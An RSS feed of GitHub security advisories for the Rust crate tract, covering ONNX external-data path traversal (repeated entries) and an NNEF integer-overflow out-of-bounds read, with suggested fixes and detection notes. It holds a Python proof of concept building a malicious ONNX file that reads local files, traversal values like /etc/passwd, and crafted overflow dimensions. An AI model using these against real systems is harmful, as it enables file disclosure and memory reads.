<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-06-19T20:28:11.849Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
        <updated>2026-06-19T14:45:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
<h3 id="details">Details</h3>
<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
</code></pre>
<ul>
<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
</ul>
<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
<ol>
<li>A canary file the model must not be able to read:
<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
</ol>
<pre><code class="language-python">import onnx
from onnx import helper, TensorProto, StringStringEntryProto
N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
node = helper.make_node("Identity", ["W"], ["Y"])
out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
g = helper.make_graph([node], "g", [], [out], initializer=[w])
m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
open("evil.onnx", "wb").write(m.SerializeToString())
</code></pre>
<ol start="3">
<li>Victim loads the untrusted model with the standard API:</li>
</ol>
<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
println!("{:?}", String::from_utf8_lossy(&amp;bytes));
</code></pre>
<p>Output:</p>
<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
</code></pre>
<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
<h3 id="impact">Impact</h3>
<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T14:45:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
        <updated>2026-06-19T14:45:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
<h3 id="details">Details</h3>
<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
</code></pre>
<ul>
<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
</ul>
<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
<ol>
<li>A canary file the model must not be able to read:
<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
</ol>
<pre><code class="language-python">import onnx
from onnx import helper, TensorProto, StringStringEntryProto
N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
node = helper.make_node("Identity", ["W"], ["Y"])
out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
g = helper.make_graph([node], "g", [], [out], initializer=[w])
m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
open("evil.onnx", "wb").write(m.SerializeToString())
</code></pre>
<ol start="3">
<li>Victim loads the untrusted model with the standard API:</li>
</ol>
<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
println!("{:?}", String::from_utf8_lossy(&amp;bytes));
</code></pre>
<p>Output:</p>
<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
</code></pre>
<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
<h3 id="impact">Impact</h3>
<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T14:45:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
        <updated>2026-06-19T14:45:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
<h3 id="details">Details</h3>
<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
</code></pre>
<ul>
<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
</ul>
<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
<ol>
<li>A canary file the model must not be able to read:
<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
</ol>
<pre><code class="language-python">import onnx
from onnx import helper, TensorProto, StringStringEntryProto
N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
node = helper.make_node("Identity", ["W"], ["Y"])
out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
g = helper.make_graph([node], "g", [], [out], initializer=[w])
m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
open("evil.onnx", "wb").write(m.SerializeToString())
</code></pre>
<ol start="3">
<li>Victim loads the untrusted model with the standard API:</li>
</ol>
<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
println!("{:?}", String::from_utf8_lossy(&amp;bytes));
</code></pre>
<p>Output:</p>
<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
</code></pre>
<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
<h3 id="impact">Impact</h3>
<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T14:45:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-nnef] tract-nnef: integer overflow in NNEF `.dat` tensor parser yields an out-of-bounds read on model load]]></title>
        <id>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</id>
        <link href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg"/>
        <updated>2026-06-18T15:05:24.000Z</updated>
        <content type="html"><![CDATA[<ul>
<li><strong>Component:</strong> <code>tract-nnef</code> (<code>nnef/src/tensors.rs::read_tensor</code>) + <code>tract-data</code> (<code>data/src/tensor.rs</code>)</li>
<li><strong>Affected versions:</strong> <code>&lt; 0.21.16</code>, <code>0.22.0</code>–<code>0.22.2</code>, <code>0.23.0</code>–<code>0.23.1</code> — the dense <code>DatLoader</code> path was unguarded across all three release lines; patched in 0.21.16 / 0.22.2 / 0.23.1</li>
<li><strong>Class:</strong> CWE-190 (integer overflow) → CWE-125 (out-of-bounds read)</li>
<li><strong>Trigger:</strong> loading a crafted NNEF model archive (<code>*.nnef.tgz</code> / <code>*.nnef.tar</code> / dir) via the public <code>tract_nnef::nnef().model_for_path</code> / <code>model_for_read</code></li>
<li><strong>Impact:</strong> <code>read_tensor</code> returns a memory-unsafe tensor (reported <code>len</code> 2^61 over a 56-byte heap allocation). Always-on primitive: a <strong>bounded heap out-of-bounds read</strong> during model build (<code>as_uniform</code>), an adjacent-heap information-disclosure reachable via the public load API. The resulting slice is an unsound <code>from_raw_parts(ptr, 2^61)</code> that <strong>SIGSEGVs (DoS)</strong> on any access past the mapped region (demonstrated by direct access). No out-of-bounds write and no RCE were achieved — tract's const-folding/<code>as_uniform</code> fast-paths fold simple consuming graphs without the full read.</li>
<li><strong>Severity:</strong> Medium</li>
</ul>
<h2 id="summary">Summary</h2>
<p><code>read_tensor</code> builds a tensor <code>shape</code> from attacker-controlled 32-bit dimensions and computes the element count <code>len = product(shape)</code> and the byte allocation <code>product(shape) * size_of(dt)</code> with <strong>unchecked <code>usize</code> arithmetic</strong>. In <code>--release</code> (no <code>overflow-checks</code>), both products wrap modulo 2^64. An attacker chooses dimensions so that the wrapped products collapse to a small value that satisfies the header consistency check, while the <em>true</em> element count remains astronomically large. <code>read_tensor</code> returns <code>Ok</code> with a <code>Tensor</code> whose reported <code>len</code> (e.g. 2^61+7) is far larger than its backing heap allocation (e.g. 56 bytes). The unchecked slice accessor <code>as_slice_unchecked</code> (<code>from_raw_parts(ptr, self.len)</code>) then produces a slice spanning ~18 exabytes over a 56-byte buffer. The out-of-bounds read fires automatically during model build (no inference required), reachable through the default <code>DatLoader</code> resource loader.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>nnef/src/tensors.rs</code>, <code>read_tensor</code>:</p>
<pre><code>let shape: TVec&lt;usize&gt; = header.dims[0..header.rank as usize].iter().map(|d| *d as _).collect();
let len = shape.iter().product::&lt;usize&gt;();                       // (1) unchecked, wraps
...
} else if header.bits_per_item != u32::MAX
    &amp;&amp; len * (header.bits_per_item as usize / 8) != header.data_size_bytes as usize  // (2) wrapped == u32
{
    bail!(...);
}
...
let mut tensor = unsafe { Tensor::uninitialized_dt(dt, &amp;shape)? };   // (3) alloc off the same wrapped product
...
reader.read_exact(plain.as_bytes_mut())?;                            // storage-bounded read, no overflow here
Ok(tensor)
</code></pre>
<p><code>data/src/tensor.rs</code>, <code>uninitialized_aligned_dt</code>:</p>
<pre><code>let bytes = shape.iter().cloned().product::&lt;usize&gt;() * dt.size_of();  // (3) wraps to the same small value
let storage = ... Blob::new_for_size_and_align(bytes, alignment) ...;
...
tensor.update_strides_and_len();                                     // len = product(shape), wraps, no clamp
</code></pre>
<p>The three quantities — the consistency-check LHS <code>(2)</code>, the allocation <code>(3)</code>, and the reported <code>len</code> — are all the same wrapped <code>product(shape)*size_of</code>, so they stay mutually consistent and <strong>the consistency check at <code>(2)</code> cannot catch the overflow</strong>. <code>data_size_bytes</code> is a <code>u32</code>, so the attacker simply sets it to the wrapped value.</p>
<p>Corruption sink — <code>data/src/tensor.rs::as_slice_unchecked</code> (and <code>data/src/tensor/plain_view.rs::as_slice_unchecked</code>):</p>
<pre><code>if self.storage.byte_len() == 0 { &amp;[] }
else { std::slice::from_raw_parts(self.as_ptr_unchecked(), self.len()) }  // len = 2^61 over a 56-byte alloc
</code></pre>
<p>The only guard is <code>byte_len() == 0</code>. A small <strong>non-zero</strong> allocation defeats it and yields an unsound oversized slice.</p>
<h2 id="witness-f64">Witness (F64)</h2>
<pre><code>dims          = [33955849, 7005787, 359, 3, 3, 3]   (rank 6, each &lt;= u32::MAX)
product(shape)= 2_305_843_009_213_693_959 = 2^61 + 7
bits_per_item = 64 (F64), item_type = 0, item_type_vendor = 0
data_size_bytes = 56            # == (2^61+7)*8 mod 2^64
</code></pre>
<ul>
<li><code>len * (bits/8) mod 2^64 = (2^61+7)*8 mod 2^64 = 56 == data_size_bytes</code> → consistency check passes.</li>
<li>allocation = <code>(2^61+7)*8 mod 2^64 = 56</code> bytes (7 × F64).</li>
<li>reported <code>len</code> = <code>2^61+7</code> elements.</li>
</ul>
<p>Only the <code>is_copy()</code> numeric arms (F16/F32/F64/int, and likely the <code>complex</code> arms) are exploitable. F64 is the cleanest (<code>bits/8</code> divides evenly). The <code>bool</code>, <code>String</code>, and block-quant paths are each guarded by an independent mechanism (size_of==1 prevents byte/element divergence; <code>String</code> bails on a missing <code>num_traits::Zero</code> impl; block-quant has its own <code>ensure!(expected_len == data_size_bytes)</code> and uses non-plain <code>Exotic</code> storage).</p>
<h2 id="reachability-load-time-public-api">Reachability (load-time, public API)</h2>
<pre><code>nnef().model_for_read(tar)
  -&gt; proto_model_for_read                       nnef/src/framework.rs:303
    -&gt; DatLoader.try_load (any *.dat)            nnef/src/resource.rs:97   (default loader, framework.rs:33)
      -&gt; read_tensor -&gt; Ok(Tensor{len=2^61+7, storage=56B})   nnef/src/tensors.rs:61
  -&gt; into_typed_model -&gt; variable() fragment     nnef/src/ops/nnef/deser.rs:74
       ensure!(tensor.shape() == &amp;*shape)        deser.rs:122  (attacker matches shape in graph.nnef -&gt; passes)
    -&gt; Const::new -&gt; wire_node                   core/src/model/typed.rs:67
      -&gt; Const::output_facts                     core/src/ops/konst.rs:54
        -&gt; TypedFact::try_from                   core/src/model/fact.rs:459
          -&gt; Tensor::as_uniform -&gt; is_uniform_t::&lt;f64&gt;   data/src/tensor.rs:1099
            -&gt; as_slice_unchecked::&lt;f64&gt;         data/src/tensor.rs:1044
              -&gt; from_raw_parts(ptr, 2^61+7) over 56-byte buffer -&gt; OOB READ
</code></pre>
<p>No shape-vs-storage re-validation exists anywhere on this path (<code>proto.validate()</code> checks only the AST; <code>Const::new</code> checks only <code>is_plain</code>; <code>check_for_access</code> checks only the datum type; even the <em>safe</em> <code>PlainView::as_slice</code> does <code>from_raw_parts(ptr, self.len)</code> with no length guard).</p>
<h2 id="execution-proof-of-concept">Execution (proof of concept)</h2>
<p>Reproduced against the crate at the affected revision, <code>--release</code>, x86_64-linux. Three scenarios:</p>
<ol>
<li><strong>Direct <code>read_tensor</code></strong> — feed the crafted 128-byte header + 56-byte payload:<ul>
<li><code>read_tensor -&gt; Ok</code>, <code>shape=[33955849,7005787,359,3,3,3]</code>, <code>len()=2305843009213693959</code>, <code>as_bytes().len()=56</code>, <code>as_slice::&lt;f64&gt;().len()=2305843009213693959</code>.</li>
<li><code>s[7]</code> (first element past the 56-byte allocation) returns <code>0x0000000000000041</code> → <strong>heap OOB read</strong> (adjacent-heap disclosure).</li>
<li><code>s[1&lt;&lt;40]</code> → <strong>SIGSEGV</strong> (signal 11).</li>
</ul>
</li>
<li><strong>Public load API</strong> — build a malicious <code>.nnef.tar</code> (<code>graph.nnef</code> with <code>variable(label='weights', shape=[...])</code> + <code>weights.dat</code>) and call <code>nnef().model_for_read()</code>:<ul>
<li>returns <code>Ok</code> with one <code>Const</code> node, <code>out[0].fact.uniform=Some(...)</code>, <code>len()=2305843009213693959</code> over a 56-byte buffer → confirms <code>as_uniform</code>/<code>is_uniform_t</code>/<code>as_slice_unchecked</code> performed an <strong>OOB read on load</strong> (bounded over-read here because <code>is_uniform</code>'s <code>.all()</code> short-circuits on the uniform <code>0x41</code> payload).</li>
</ul>
</li>
<li><strong>Optimized graph</strong> — same archive but the const is consumed (<code>output = mul(weights, weights)</code>), then <code>into_optimized</code> / <code>run</code>:<ul>
<li><strong>Does not crash.</strong> With both a uniform (<code>0x41×56</code>) and a non-uniform (<code>0..56</code>) payload, <code>into_optimized</code> const-folds <code>mul(const, const)</code> to a single node <strong>without a full-length materialization</strong> of the oversized const, and <code>run</code> completes. A reliable arbitrary-length crash through a <em>normal optimized graph</em> was therefore NOT demonstrated; the always-on primitive is the bounded load-time over-read (scenario 2), and the wild-slice SIGSEGV is shown via direct access (scenario 1).</li>
</ul>
</li>
</ol>
<p>Runnable PoC sources are available to the maintainers on request.</p>
<h2 id="detection">Detection</h2>
<ul>
<li><strong>Static:</strong> flag <code>*.iter().product::&lt;usize&gt;()</code> over externally-controlled dimensions without <code>checked_*</code>/<code>try_into</code>, especially when the result feeds an allocation and a separately-tracked <code>len</code>.</li>
<li><strong>Runtime / fleet:</strong> crash telemetry showing SIGSEGV inside <code>is_uniform_t</code> / <code>from_raw_parts</code> during NNEF model load; an ASAN build flags <code>heap-buffer-overflow READ</code> in <code>read_tensor</code>→<code>as_uniform</code>.</li>
<li><strong>Input filter (compensating):</strong> reject NNEF <code>.dat</code> tensors where <code>product(dims)</code> overflows <code>u64</code>, or where <code>product(dims) * size_of(dt) != data_size_bytes</code> computed in <strong>checked</strong> arithmetic, before constructing the tensor.</li>
<li><strong>YARA-ish heuristic for <code>.dat</code> blobs:</strong> NNEF magic <code>4E EF 01 00</code>, <code>rank&lt;=8</code>, and any <code>dim &gt;= 0x10000</code> whose checked product with the others overflows.</li>
</ul>
<h2 id="mitigation-suggested-fix">Mitigation (suggested fix)</h2>
<p>In <code>read_tensor</code>, compute the element count and byte size with checked arithmetic and reject on overflow, mirroring the guard already present on the block-quant path (<code>ensure!(expected_len == data_size_bytes)</code> added in <code>eacd13ccb</code>):</p>
<pre><code>let len = shape.iter().try_fold(1usize, |a, &amp;d| a.checked_mul(d))
    .context("tensor shape product overflows usize")?;
let byte_size = len.checked_mul(dt.size_of())
    .context("tensor byte size overflows usize")?;
ensure!(byte_size == header.data_size_bytes as usize, "shape/len vs data_size_bytes mismatch");
</code></pre>
<p>Defense in depth: make <code>Tensor::uninitialized_aligned_dt</code> reject when <code>product(shape)*size_of</code> overflows, and add a <code>len * size_of == storage.byte_len()</code> invariant check in the <code>as_slice*</code> accessors (or at <code>Tensor</code> construction) so a <code>len</code>/storage mismatch can never reach <code>from_raw_parts</code>.</p>
<p>Mapping: CWE-190, CWE-125; mitigations align with input validation (OWASP ASVS V5) and safe integer handling (CERT INT32-C analogue).</p>
<h2 id="prior-art--why-this-is-not-already-fixed">Prior art / why this is not already fixed</h2>
<ul>
<li><code>eacd13ccb</code> (2026-03-23, "Add blob-size validation to BlockQuantStorage constructors") added overflow/blob-size validation <strong>only to the block-quant path</strong>; the dense <code>DatLoader</code>/<code>read_tensor</code> path was left unguarded. The maintainers fixed the sibling and missed this one.</li>
<li>PR #745 ("Fix UB by creating uninit Tensors with a non-null pointer") is a <em>different</em> UB (null base pointer on zero-length slices) in the same module family.</li>
<li>No CVE / RustSec / GHSA / OSV / Huntr entry matches this bug; last change to <code>nnef/src/tensors.rs</code> predates HEAD and added no overflow guard to the dense path.</li>
</ul>
<hr>
<p>Reported by: s1ko (<a href="mailto:s1ko@riseup.net">s1ko@riseup.net</a> · github.com/s1ko)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg</a></li>
<li><a href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/advisories/GHSA-x5mv-8wgw-29hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:05:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-nnef] tract-nnef: integer overflow in NNEF `.dat` tensor parser yields an out-of-bounds read on model load]]></title>
        <id>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</id>
        <link href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg"/>
        <updated>2026-06-18T15:05:24.000Z</updated>
        <content type="html"><![CDATA[<ul>
<li><strong>Component:</strong> <code>tract-nnef</code> (<code>nnef/src/tensors.rs::read_tensor</code>) + <code>tract-data</code> (<code>data/src/tensor.rs</code>)</li>
<li><strong>Affected versions:</strong> <code>&lt; 0.21.16</code>, <code>0.22.0</code>–<code>0.22.2</code>, <code>0.23.0</code>–<code>0.23.1</code> — the dense <code>DatLoader</code> path was unguarded across all three release lines; patched in 0.21.16 / 0.22.2 / 0.23.1</li>
